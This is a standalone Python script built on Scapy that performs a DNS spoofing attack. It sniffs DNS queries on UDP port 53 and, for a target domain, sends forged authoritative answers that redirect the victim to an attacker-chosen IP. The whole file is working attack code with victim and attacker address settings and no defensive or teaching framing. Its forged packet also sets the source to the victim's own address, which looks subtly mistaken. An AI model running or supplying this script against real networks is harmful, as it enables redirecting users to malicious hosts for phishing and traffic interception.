from scapy.all import *
import random

# Configuration
victim_ip = "192.168.1.101"        # Replace with actual victim IP
attacker_ip = "192.168.1.100"      # Replace with attacker's IP
domain_to_spoof = "www.example.com"
fake_ip = "192.168.1.200"          # IP to which victim will be redirected

# Track spoofed domains to avoid repetition
spoofed_domains = set()

def dns_spoof(packet):
    if packet.haslayer(DNSQR):
        query = packet[DNSQR].qname.decode()
        print(f"📡 DNS Request Detected: {query}")

        if domain_to_spoof in query and query not in spoofed_domains:
            spoofed_domains.add(query)
            spoofed_response = (
                IP(src=victim_ip, dst=packet[IP].src) /
                UDP(sport=53, dport=packet[UDP].sport) /
                DNS(
                    id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                    an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=fake_ip)
                )
            )
            send(spoofed_response, verbose=0)
            print(f"✅ Spoofed {query} → {fake_ip} and sent to {packet[IP].src}")

print("🔍 DNS Spoofing Attack Started... Waiting for DNS request...")
sniff(filter="udp port 53", prn=dns_spoof, store=0)
